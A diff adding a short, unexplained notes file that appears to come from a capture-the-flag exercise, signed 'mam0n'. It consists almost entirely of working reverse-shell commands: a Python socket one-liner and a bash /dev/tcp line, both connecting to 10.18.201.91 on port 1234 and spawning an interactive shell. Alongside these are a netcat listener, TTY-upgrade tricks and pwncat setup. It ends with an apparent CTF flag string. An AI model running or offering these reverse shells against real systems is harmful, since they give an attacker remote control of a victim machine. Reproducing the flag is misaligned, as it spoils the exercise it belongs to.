@@ -1,0 +1,18 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.201.91",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+
+rlwrap nc -lvnp 1234
+/bin/bash -c 'exec bash -i >& /dev/tcp/10.18.201.91/1234 0>&1'
+export TERM=xterm
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -m pwncat -lp 1234
+pip3 install pwncat-cs
+
+by mam0n
+
+
+HTR{h1_4dm1n_0P3n_tH3_n3Tw0rK_f0R_m3_pL3a53}
+
+
+
+
